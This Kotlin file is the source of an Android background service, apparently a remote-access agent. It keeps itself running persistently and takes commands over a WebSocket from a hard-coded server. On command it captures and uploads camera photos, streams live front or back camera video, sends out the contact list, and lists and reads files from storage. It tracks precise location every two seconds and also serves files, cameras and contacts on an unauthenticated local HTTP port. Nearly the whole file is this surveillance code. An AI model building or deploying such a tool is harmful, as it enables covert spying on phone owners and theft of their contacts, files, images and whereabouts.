package com.example.alex


import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.Environment
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import fi.iki.elonen.NanoHTTPD
import fi.iki.elonen.NanoHTTPD.newChunkedResponse
import fi.iki.elonen.NanoHTTPD.newFixedLengthResponse
import java.io.File
import java.io.FileInputStream
import java.net.URLConnection
import java.util.concurrent.CountDownLatch
import android.content.Context
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.provider.ContactsContract
import com.google.gson.Gson
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import org.json.JSONObject
import java.net.URI
import android.os.Looper
import okhttp3.OkHttpClient
import java.net.HttpURLConnection
import java.net.URL
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString
import android.Manifest
import android.app.AlarmManager
import android.app.PendingIntent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.Uri
import android.os.PowerManager
import android.provider.Settings
import android.util.Base64

import androidx.core.app.ActivityCompat
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority


class RemoteAgentService : Service() {

    private lateinit var server: NanoHTTPD
    private lateinit var wakeLock: PowerManager.WakeLock

    private var wsClient: WebSocketClient? = null
    private val deviceId = "android-device-001" // give a unique ID per device

    companion object {
        private const val SERVER_IP = "192.168.31.50"
        private const val SERVER_PORT = 3003

        const val WS_URL = "ws://$SERVER_IP:$SERVER_PORT/ws"
        const val HTTP_BASE = "http://$SERVER_IP:$SERVER_PORT"
    }


    override fun onCreate() {
        super.onCreate()
        startForeground(1, createNotification())

        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RemoteAgent::WakeLock")
        wakeLock.acquire(10*60*1000L /*10 minutes*/)

        fun ignoreBatteryOptimizations() {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            val packageName = packageName

            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                startActivity(intent)
            }
        }

        ignoreBatteryOptimizations()
        startServer()
        registerNetworkCallback()
        connectWebSocket()
        startLocationUpdates()

    }

    private var reconnecting = false
    private var isStreaming = false

    private fun connectWebSocket() {

        println("🌐 Trying to connect to WebSocket...")

        try {
            val serverUri = URI(WS_URL)
            wsClient = object : WebSocketClient(serverUri) {

                override fun onOpen(handshakedata: ServerHandshake?) {
                    println("✅ Connected to WebSocket server")
                    reconnecting = false

                    // 📌 Safe register message
                    safeSend("""{"type":"hello","deviceId":"$deviceId"}""")

                    // 🔹 Start ping keepalive
                    startPingTimer()
                }

                override fun onMessage(message: String?) {
                    if (message == null) return
                    try {
                        val json = JSONObject(message)
                        when (json.optString("type")) {

                            "capture" -> handleCapture(json.optString("which"))
                            "video" -> handleVideo(json.optString("which"))
                            "contacts" -> handleContactsUpload()
                            "files" -> handleFileUpload()
                            "location" -> handleLocation()

                            "file_list" -> {
                                val path = json.optString("path", "")
                                handleFileListWS(path)
                            }

                            "file_read" -> {
                                val path = json.optString("path", "")
                                handleFileReadWS(path)
                            }

                            // 📌 Protected ping
                            "ping" -> safeSend("""{"type":"pong","deviceId":"$deviceId"}""")
                        }
                    } catch (e: Exception) {
                        println("⚠️ Error parsing message: ${e.message}")
                    }
                }

                override fun onClose(code: Int, reason: String?, remote: Boolean) {
                    println("❌ WebSocket closed: $reason")
                    stopStreaming()
                    scheduleReconnect()
                }

                override fun onError(ex: Exception?) {
                    println("⚠️ WebSocket error: ${ex?.message}")
                    stopStreaming()
                    scheduleReconnect()
                }
            }

            wsClient?.connect()

        } catch (e: Exception) {
            e.printStackTrace()
            scheduleReconnect()
        }
    }


    private fun startPingTimer() {
        val handler = Handler(Looper.getMainLooper())

        val runnable = object : Runnable {
            override fun run() {
                try {
                    val ws = wsClient

                    // 🛑 WS not connected → skip ping safely
                    if (ws == null || !ws.isOpen) {
                        println("⚠️ Ping skipped, WS not connected")
                        handler.postDelayed(this, 10000)
                        return
                    }

                    // ✅ Safe WS send
                    safeSend("""{"type":"ping","deviceId":"$deviceId"}""")
                    println("ping pong")
                } catch (e: Exception) {
                    println("⚠️ Ping failed: ${e.message}")
                }

                // Schedule next ping
                handler.postDelayed(this, 10000)
            }
        }

        handler.postDelayed(runnable, 10000)
    }

    private fun safeSend(msg: String) {
        try {
            if (wsClient != null && wsClient!!.isOpen) {
                wsClient!!.send(msg)
            } else {
                println("⚠️ WS not connected, message dropped: $msg")
            }
        } catch (e: Exception) {
            println("❌ WS send failed: ${e.message}")
        }
    }




//    private fun scheduleReconnect() {
//        if (reconnecting) return
//        reconnecting = true
//        println("🔁 Reconnecting WebSocket in 3s…")
//
//        Handler(Looper.getMainLooper()).postDelayed({
//            reconnecting = false // ✅ allow next attempt
//            connectWebSocket()
//        }, 3000)
//    }

    private fun safeWsSend(msg: String) {
        try {
            val ws = wsClient
            if (ws != null && ws.isOpen) {
                ws.send(msg)
            } else {
                println("⚠️ WS not connected — skipping send: $msg")
            }
        } catch (e: Exception) {
            println("❌ WS send failed: ${e.message}")
        }
    }


    private fun scheduleReconnect() {
        if (reconnecting) return
        reconnecting = true
        println("🔁 Reconnecting WebSocket in 3s…")

        Thread {
            Thread.sleep(3000)
            reconnecting = false
            connectWebSocket()
        }.start()
    }


    private fun stopStreaming() {
        if (isStreaming) {
            println("🛑 stopStreaming called — delegating to stopCameraStreaming()")
            isStreaming = false
            stopCameraStreaming()
        }
    }



    private fun getContactsJson(): String {
        val contactsList = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null, null, null
        )

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                contactsList.add(mapOf("name" to name, "number" to number))
            }
        }
        return Gson().toJson(contactsList)
    }

    private fun startLocationUpdates() {
        val client = LocationServices.getFusedLocationProviderClient(this)

        val request = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY,
            2000 // 2 seconds
        ).setMinUpdateDistanceMeters(1f)
            .setWaitForAccurateLocation(true)
            .build()

        val callback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                try {
                    val loc = result.lastLocation ?: return

                    val json = """
            {
              "type": "location",
              "deviceId": "$deviceId",
              "lat": ${loc.latitude},
              "lng": ${loc.longitude},
              "accuracy": ${loc.accuracy}
            }
        """.trimIndent()

                    if (wsClient != null && wsClient!!.isOpen) {
                        wsClient!!.send(json)
                    } else {
                        println("⚠️ WebSocket not connected — skipping location send")
                    }

                    println("📍 Background Location: $json")
                } catch (e: Exception) {
                    println("❌ LOCATION CALLBACK CRASH PREVENTED: ${e.message}")
                }
            }

        }

        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) return

        client.requestLocationUpdates(request, callback, Looper.getMainLooper())
    }


    private fun handleLocation() {

        if (ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            wsClient?.send(
                """{
                "type":"location",
                "deviceId":"$deviceId",
                "error":"Location permission not granted"
            }"""
            )
            return
        }

        val locationManager = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager

        val providers = locationManager.getProviders(true)
        var bestLocation: android.location.Location? = null

        for (provider in providers) {
            val l = try { locationManager.getLastKnownLocation(provider) } catch (e: Exception) { null }
            if (l != null) {
                if (bestLocation == null || l.accuracy < bestLocation!!.accuracy) {
                    bestLocation = l
                }
            }
        }

        if (bestLocation == null) {
            wsClient?.send(
                """{
                "type":"location",
                "deviceId":"$deviceId",
                "error":"No location available"
            }"""
            )
            return
        }

        val json = """
        {
          "type": "location",
          "deviceId": "$deviceId",
          "lat": ${bestLocation.latitude},
          "lng": ${bestLocation.longitude},
          "accuracy": ${bestLocation.accuracy}
        }
    """.trimIndent()

        wsClient?.send(json)

        println("📍 Sent location: $json")
    }



    private fun handleCapture(which: String) {

        if (which == "stop") {
            stopCameraStreaming()
            return
        }

        val cameraList = when (which) {
            "front" -> listOf(CameraCharacteristics.LENS_FACING_FRONT)
            "back" -> listOf(CameraCharacteristics.LENS_FACING_BACK)
            else -> {
                listOf(CameraCharacteristics.LENS_FACING_BACK)
            }
        }

        Thread {
            for (facing in cameraList) {
                try {
                    val response = captureCameraImage(facing)
                    val bytes = response.data?.readBytes()
                    if (bytes != null) {
                        val whichStr =
                            if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
                        val url = URL("$HTTP_BASE/capture?which=$whichStr")
                        val conn = url.openConnection() as HttpURLConnection
                        conn.requestMethod = "POST"
                        conn.doOutput = true
                        conn.setRequestProperty("Content-Type", "image/jpeg")
                        conn.outputStream.use { it.write(bytes) }
                        conn.responseCode
                        conn.disconnect()
                        println("📤 Uploaded $whichStr image")
                    }
                } catch (ex: Exception) {
                    ex.printStackTrace()
                    try {
                        val ws = wsClient
                        if (ws != null && ws.isOpen) {
                            ws.send("{\"status\":\"upload_failed\",\"error\":\"${ex.message}\"}")
                        } else {
                            println("⚠️ Cannot report upload_failed — WS not connected")
                        }
                    } catch (e2: Exception) {
                        println("❌ Failed to send upload_failed WS message: ${e2.message}")
                    }

                }
            }
        }.start()
    }

    private fun handleVideo(which: String) {
        when (which) {
            "stop" -> {
                println("🛑 Stop request received")
                stopCameraStreaming()
            }

            "front" -> {
                println("🎥 Switching to FRONT camera")
                streamCameraVideo(CameraCharacteristics.LENS_FACING_FRONT)
            }

            "back" -> {
                println("🎥 Switching to BACK camera")
                streamCameraVideo(CameraCharacteristics.LENS_FACING_BACK)
            }

            else -> {
                println("⚠️ Unknown camera command: $which")
            }
        }
    }


    private fun handleContactsUpload() {
        val contactsJson = getContactsJson()

        Thread {
            try {
                val url = URL("$HTTP_BASE/contacts")
                val conn = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                }

                val jsonBody = """{"deviceId":"$deviceId","contacts":$contactsJson}"""
                conn.outputStream.use { it.write(jsonBody.toByteArray()) }

                val code = conn.responseCode
                println("📤 Contacts uploaded: $code")

                safeWsSend("{\"status\":\"contacts_uploaded\",\"deviceId\":\"$deviceId\"}")

            } catch (ex: Exception) {
                ex.printStackTrace()
                safeWsSend("{\"status\":\"contacts_failed\",\"error\":\"${ex.message}\"}")
            }
        }.start()
    }

    private fun handleFileUpload() {
        val baseDir = Environment.getExternalStorageDirectory()
        val files = baseDir.listFiles()?.map {
            mapOf("name" to it.name, "path" to it.absolutePath, "isDir" to it.isDirectory)
        } ?: emptyList()

        val jsonBody = Gson().toJson(mapOf("deviceId" to deviceId, "files" to files))

        Thread {
            try {
                val url = URL("$HTTP_BASE/files")
                val conn = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                }
                conn.outputStream.use { it.write(jsonBody.toByteArray()) }
                conn.responseCode
                println("📂 File list uploaded")
            } catch (ex: Exception) {
                ex.printStackTrace()
            }
        }.start()
    }



//    ---WS file handle

    private fun sendWS(data: Map<String, Any?>) {
        try {
            val ws = wsClient
            if (ws != null && ws.isOpen) {
                val json = JSONObject(data).toString()
                ws.send(json)
            } else {
                println("⚠️ WS not connected — skipping WS send: $data")
            }
        } catch (e: Exception) {
            println("❌ WS send failed: ${e.message}")
        }
    }



    private fun handleFileListWS(path: String) {
        val baseDir = Environment.getExternalStorageDirectory()
        val target = File(baseDir, path)

        if (!target.exists() || !target.isDirectory) {
            sendWS(
                mapOf(
                    "type" to "file_list_result",
                    "path" to path,
                    "error" to "Path not found"
                )
            )
            return
        }

        val items = target.listFiles()?.map {
            mapOf(
                "name" to it.name,
                "isDir" to it.isDirectory,
                "size" to if (it.isFile) it.length() else null
            )
        } ?: emptyList()

        sendWS(
            mapOf(
                "type" to "file_list_result",
                "path" to path,
                "items" to items
            )
        )
    }


    private fun handleFileReadWS(path: String) {
        val baseDir = Environment.getExternalStorageDirectory()
        val target = File(baseDir, path)

        if (!target.exists() || !target.isFile) {
            sendWS(
                mapOf(
                    "type" to "file_read_result",
                    "path" to path,
                    "error" to "File not found"
                )
            )
            return
        }

        try {
            val bytes = target.readBytes()
            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)

            sendWS(
                mapOf(
                    "type" to "file_read_result",
                    "path" to path,
                    "data" to base64
                )
            )
        } catch (e: Exception) {
            println("❌ File read failed: ${e.message}")
            sendWS(
                mapOf(
                    "type" to "file_read_result",
                    "path" to path,
                    "error" to e.message
                )
            )
        }
    }






//    ----------------------------------------------------------------------------------



    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // If service is killed by the system, restart it
        return START_STICKY
    }

    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            connectWebSocket()
        }
    }

    private fun registerNetworkCallback() {
        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        val request = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()

        connectivityManager.registerNetworkCallback(
            request,
            object : ConnectivityManager.NetworkCallback() {

                override fun onAvailable(network: Network) {
                    println("✅ Network available — reconnecting WebSocket")
                    connectWebSocket()  // ONLY connect when network returns
                }

                override fun onLost(network: Network) {
                    println("❌ Network lost — stopping WebSocket")
                    try {
                        wsClient?.close()
                    } catch (_: Exception) {}
                }
            }
        )
    }



    // ✅ Add this method
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)

        println("🛑 App removed from recent — restarting service")

        val restartIntent = Intent(applicationContext, RemoteAgentService::class.java)
        restartIntent.putExtra("from_restart", true)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent)
        } else {
            startService(restartIntent)
        }
    }



    private fun startServer() {
        server = object : NanoHTTPD(8080) {
            override fun serve(session: IHTTPSession): Response {
                return when {
                    session.uri.startsWith("/files") -> handleFileList(session)
                    session.uri == "/capture/front" -> captureCameraImage(CameraCharacteristics.LENS_FACING_FRONT)
                    session.uri == "/capture/back" -> captureCameraImage(CameraCharacteristics.LENS_FACING_BACK)
//                    session.uri == "/video/front" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_FRONT)
//                    session.uri == "/video/back" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_BACK)
                    session.uri == "/contacts" -> getContacts()
                    session.uri == "/location" -> getLocationHttp()
                    session.uri == "/status" -> newFixedLengthResponse("OK: ${System.currentTimeMillis()}")
                    else -> newFixedLengthResponse(
                        Response.Status.OK,
                        "text/html",
                        """
                        <h3>Remote Agent Active</h3>
                        <ul>
                            <li><a href='/files'>📁 Browse Files</a></li>
                            <li><a href='/contacts'>📸 Contacts</a></li>
                            <li><a href='/capture/front'>🤳 Front Camera</a></li>
                            <li><a href='/capture/back'>📸 Back Camera</a></li>
                             <li><a href='/video/front'>🤳 Front Video Camera</a></li>
                            <li><a href='/video/back'>📸 Back Video Camera</a></li>
                            <li><a href='location'>Location</a></li>
                        </ul>
                    """.trimIndent()
                    )
                }
            }
        }
        server.start()
    }

    private fun handleFileList(session: NanoHTTPD.IHTTPSession): NanoHTTPD.Response {
        val baseDir = Environment.getExternalStorageDirectory()
        val relativePath = session.uri.removePrefix("/files").trim('/')
        val target = File(baseDir, relativePath)

        if (!target.exists()) {
            return newFixedLengthResponse(NanoHTTPD.Response.Status.NOT_FOUND, "text/plain", "404 Not Found")
        }

        // If directory → show clickable list
        if (target.isDirectory) {
            val files = target.listFiles()?.sortedBy { !it.isDirectory } ?: emptyList()
            val html = buildString {
                append("<h3>Index of /files/$relativePath</h3><ul>")
                if (relativePath.isNotEmpty()) {
                    val parent = File(relativePath).parent ?: ""
                    append("<li><a href='/files/$parent'>⬅️ Up</a></li>")
                }
                for (file in files) {
                    val name = file.name
                    val href = "/files/" + if (relativePath.isEmpty()) name else "$relativePath/$name"
                    val display = if (file.isDirectory) "📁 $name" else "📄 $name"
                    append("<li><a href='$href'>$display</a></li>")
                }
                append("</ul>")
            }
            return newFixedLengthResponse(NanoHTTPD.Response.Status.OK, "text/html", html)
        }

        // If file → download stream
        val mime = URLConnection.guessContentTypeFromName(target.name) ?: "application/octet-stream"
        val inputStream = FileInputStream(target)
        return newChunkedResponse(NanoHTTPD.Response.Status.OK, mime, inputStream)
    }

    private fun captureCameraImage(lensFacing: Int): NanoHTTPD.Response {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val resultLatch = CountDownLatch(1)
        var imageBytes: ByteArray? = null

        try {
            // Find camera ID
            val cameraId = cameraManager.cameraIdList.first { id ->
                val chars = cameraManager.getCameraCharacteristics(id)
                chars.get(CameraCharacteristics.LENS_FACING) == lensFacing
            }

            val reader = ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)
            val handlerThread = HandlerThread("CameraThread").apply { start() }
            val handler = Handler(handlerThread.looper)

            val stateCallback = object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    captureRequest.addTarget(reader.surface)

                    camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            reader.setOnImageAvailableListener({ r ->
                                try {
                                    val image = r.acquireLatestImage() ?: run {
                                        println("⚠️ No image available")
                                        resultLatch.countDown()
                                        return@setOnImageAvailableListener
                                    }

                                    val buffer = image.planes[0].buffer
                                    val bytes = ByteArray(buffer.remaining())
                                    buffer.get(bytes)
                                    image.close()

                                    imageBytes = bytes
                                } catch (e: Exception) {
                                    println("❌ Failed to read captured frame: ${e.message}")
                                } finally {
                                    try { session.close() } catch (_: Exception) {}
                                    try { camera.close() } catch (_: Exception) {}
                                    handlerThread.quitSafely()
                                    resultLatch.countDown()
                                }
                            }, handler)

                            session.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {}, handler)
                        }

                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            session.close()
                            camera.close()
                            handlerThread.quitSafely()
                            resultLatch.countDown()
                        }
                    }, handler)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    handlerThread.quitSafely()
                    resultLatch.countDown()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    handlerThread.quitSafely()
                    resultLatch.countDown()
                }
            }

            try {
                cameraManager.openCamera(cameraId, stateCallback, handler)
            } catch (e: SecurityException) {
                e.printStackTrace()
                return NanoHTTPD.newFixedLengthResponse(
                    NanoHTTPD.Response.Status.FORBIDDEN,
                    "text/plain",
                    "Camera access denied"
                )
            }
            resultLatch.await() // wait for image capture
        } catch (e: Exception) {
            e.printStackTrace()
        }

        return if (imageBytes != null)
            NanoHTTPD.newFixedLengthResponse(
                NanoHTTPD.Response.Status.OK,
                "image/jpeg",
                java.io.ByteArrayInputStream(imageBytes),
                imageBytes!!.size.toLong()
            )
        else
            NanoHTTPD.newFixedLengthResponse(NanoHTTPD.Response.Status.INTERNAL_ERROR, "text/plain", "Failed to capture image")
    }

    private fun getLocationHttp(): NanoHTTPD.Response {

        if (ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return NanoHTTPD.newFixedLengthResponse(
                NanoHTTPD.Response.Status.FORBIDDEN,
                "text/plain",
                "Location permission not granted"
            )
        }

        val locationManager = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager

        val providers = locationManager.getProviders(true)
        var bestLocation: android.location.Location? = null

        for (provider in providers) {
            val l = try { locationManager.getLastKnownLocation(provider) } catch (e: Exception) { null }
            if (l != null) {
                if (bestLocation == null || l.accuracy < bestLocation!!.accuracy) {
                    bestLocation = l
                }
            }
        }

        if (bestLocation == null) {
            return NanoHTTPD.newFixedLengthResponse(
                NanoHTTPD.Response.Status.OK,
                "application/json",
                """{"error":"No location available"}"""
            )
        }

        val json = """
    {
      "lat": ${bestLocation.latitude},
      "lng": ${bestLocation.longitude},
      "accuracy": ${bestLocation.accuracy}
    }
    """.trimIndent()

        return NanoHTTPD.newFixedLengthResponse(
            NanoHTTPD.Response.Status.OK,
            "application/json",
            json
        )
    }



    private var ws: WebSocket? = null
    private var cameraDevice: CameraDevice? = null
    private var handlerThread: HandlerThread? = null
    private var imageReader: ImageReader? = null

    // Track active components for safe stopping
    private var activeCamera: CameraDevice? = null
    private var activeSession: CameraCaptureSession? = null
    private var activeThread: HandlerThread? = null
    private var activeWs: WebSocket? = null
    private var activeLensFacing: Int? = null

    private fun stopCameraStreaming() {
        println("🛑 Stopping camera stream...")

        try {
            // 1) stop repeating on whichever session exists
            try {
                activeSession?.stopRepeating()
            } catch (ise: IllegalStateException) {
                println("⚠️ stopRepeating failed on activeSession: ${ise.message}")
            } catch (e: Exception) {
                println("⚠️ stopRepeating exception on activeSession: ${e.message}")
            }
            try {
                cameraDevice = cameraDevice ?: activeCamera
                // also protect old session variable if you used it directly
                activeSession?.stopRepeating()
            } catch (_: Exception) {}

            // 2) close/clear capture sessions
            try { activeSession?.close() } catch (e: Exception) { println("⚠️ close activeSession: ${e.message}") }
            activeSession = null
            try { /* if you had another 'session' variable, close it too */ } catch (_: Exception) {}

            // 3) remove image listener and close reader
            try { imageReader?.setOnImageAvailableListener(null, null) } catch (_: Exception) {}
            try { imageReader?.close() } catch (e: Exception) { println("⚠️ imageReader close: ${e.message}") }
            imageReader = null

            // 4) close camera devices (both references)
            try { activeCamera?.close() } catch (e: Exception) { println("⚠️ activeCamera close: ${e.message}") }
            activeCamera = null
            try { cameraDevice?.close() } catch (e: Exception) { println("⚠️ cameraDevice close: ${e.message}") }
            cameraDevice = null

            // 5) quit handler threads (both references)
            try { activeThread?.quitSafely() } catch (e: Exception) { println("⚠️ activeThread quit: ${e.message}") }
            activeThread = null
            try { handlerThread?.quitSafely() } catch (e: Exception) { println("⚠️ handlerThread quit: ${e.message}") }
            handlerThread = null

            // 6) close websocket(s)
            try { activeWs?.close(1000, "Stopped") } catch (e: Exception) { println("⚠️ activeWs close: ${e.message}") }
            activeWs = null
            try { ws?.close(1000, "Stopped") } catch (e: Exception) { println("⚠️ ws close: ${e.message}") }
            ws = null

            // 7) clear lens flag
            activeLensFacing = null

            println("✅ Camera stopped cleanly.")
        } catch (e: Exception) {
            println("❌ stopCameraStreaming top-level error: ${e.message}")
        }
    }




    // 🔹 Start streaming video (front/back)
    private fun streamCameraVideo(lensFacing: Int) {
        // Stop any previous stream before starting a new one
        stopCameraStreaming()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED
        ) {
            println("❌ Camera permission not granted")
            return
        }

        val wsUrl = WS_URL
        val client = OkHttpClient()
        val request = Request.Builder().url(wsUrl).build()
        val ws = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                println("📡 Connected to Node.js WS")
                try {
                    webSocket.send("""{"type":"video_stream","deviceId":"$deviceId"}""")
                } catch (e: Exception) {
                    println("❌ WS send in onOpen failed: ${e.message}")
                }

            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                println("❌ WebSocket failed: ${t.message}")
            }
        })
        activeWs = ws

        val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        val handlerThread = HandlerThread("VideoStreamThread").apply { start() }
        activeThread = handlerThread
        val handler = Handler(handlerThread.looper)

        try {
            val cameraId = cameraManager.cameraIdList.first { id ->
                val chars = cameraManager.getCameraCharacteristics(id)
                chars.get(CameraCharacteristics.LENS_FACING) == lensFacing
            }

            val reader = ImageReader.newInstance(320, 240, ImageFormat.JPEG, 2)

            val stateCallback = object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    activeCamera = camera

                    try {
                        val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                        request.addTarget(reader.surface)

                        camera.createCaptureSession(
                            listOf(reader.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    activeSession = session

                                    reader.setOnImageAvailableListener({ r ->

                                        var bytes: ByteArray? = null

                                        try {
                                            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                                            val buffer = img.planes[0].buffer
                                            bytes = ByteArray(buffer.remaining())
                                            buffer.get(bytes)
                                            img.close()
                                        } catch (e: Exception) {
                                            println("❌ Failed to read camera frame: ${e.message}")
                                            return@setOnImageAvailableListener
                                        }

                                        // if bytes is still null → do nothing
                                        val safeBytes = bytes ?: return@setOnImageAvailableListener

                                        try {
                                            try {
                                                val ws = activeWs
                                                if (ws != null && ws.send(ByteString.of(*safeBytes))) {
                                                    // OK
                                                } else {
                                                    println("⚠️ WS not connected, skipping video frame")
                                                }
                                            } catch (e: Exception) {
                                                println("❌ Video send failed: ${e.message}")
                                                stopCameraStreaming()
                                            }

                                        } catch (e: Exception) {
                                            println("⚠️ WS send failed: ${e.message}")
                                            stopCameraStreaming()
                                        }
                                    }, handler)

                                    session.setRepeatingRequest(request.build(), null, handler)
                                }

                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    println("❌ Camera config failed")
                                    stopCameraStreaming()
                                }
                            },
                            handler
                        )
                    } catch (e: Exception) {
                        e.printStackTrace()
                        stopCameraStreaming()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    println("⚠️ Camera disconnected")
                    stopCameraStreaming()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    println("❌ Camera error: $error")
                    stopCameraStreaming()
                }
            }

            cameraManager.openCamera(cameraId, stateCallback, handler)

        } catch (e: Exception) {
            e.printStackTrace()
            stopCameraStreaming()
        }
    }







    private fun stopCamera() {
        stopCameraStreaming()
    }




    private fun getContacts(): NanoHTTPD.Response {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            return NanoHTTPD.newFixedLengthResponse(
                NanoHTTPD.Response.Status.FORBIDDEN,
                "text/plain",
                "Contacts permission not granted"
            )
        }

        val contactsList = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null,
            null,
            null
        )

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                contactsList.add(mapOf("name" to name, "number" to number))
            }
        }

        val json = Gson().toJson(contactsList)
        return NanoHTTPD.newFixedLengthResponse(
            NanoHTTPD.Response.Status.OK,
            "application/json",
            json
        )
    }


    private fun createNotification(): Notification {
        val channelId = "remote_agent_channel"
        val name = "Remote Agent"
        val manager = getSystemService(NotificationManager::class.java)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, name, NotificationManager.IMPORTANCE_LOW)
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Remote Agent Active")
            .setContentText("Listening for commands on port 8080")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setOngoing(true)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        if (wakeLock.isHeld) wakeLock.release()
        server.stop()
    }



    override fun onBind(intent: Intent?): IBinder? = null
}